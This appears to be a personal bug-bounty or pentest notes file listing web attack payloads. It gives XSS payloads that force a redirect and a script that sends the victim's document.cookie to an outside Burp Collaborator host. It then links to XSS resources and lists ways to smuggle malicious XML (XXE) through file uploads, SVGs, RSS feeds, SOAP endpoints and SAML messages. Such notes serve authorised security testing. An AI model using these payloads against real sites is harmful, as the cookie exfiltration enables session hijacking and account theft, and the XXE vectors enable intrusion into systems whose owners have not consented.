# My Notes - Payload

## XSS to Open Redirection Payload:
1. http://Test"><img src=x onload=window.location="http://google.com">
2. "><img src=x onerror=window.location="http://google.com">

## Exfiltrate cookie:
<script>fetch('https://anmol.burpcollaborator.net?'+document.cookie, {method: 'POST',mode: 'no-cors',body:document.cookie});alert('exfiltrated the document.cookie');</script>

## Multi XSS Exploit in Upload File
1. <a href="https://systemweakness.com/multi-xss-exploit-in-upload-file-2bfde6ce471a">Multi XSS Exploit in Upload File</a>

## Tiny XSS
1. <a href="https://tinyxss.terjanq.me/">Tiny XSS by @terjanq</a>

## Server-Side input validation testing
1. <a href=https://redtm.com/web-pentest/server-side-input-validation>Server-Side input validation testing</a>

## XXE Techniques [Observations]
1. Convert the content type from "application/json"/"application/x-www-form-urlencoded" to "application/xml".
2. File Uploads allows for docx/xlcs/pdf/zip , unzip the package and add your evil xml code into the xml files.
3. If svg allowed in picture upload , you can inject xml in svgs.
4. If the web app offers RSS feeds , add your malicious code into the RSS.
5. Fuzz for /soap api , some applications still running soap apis
6. If the target web app allows for SSO integration, you can inject your malicious xml code in the SAML request/response
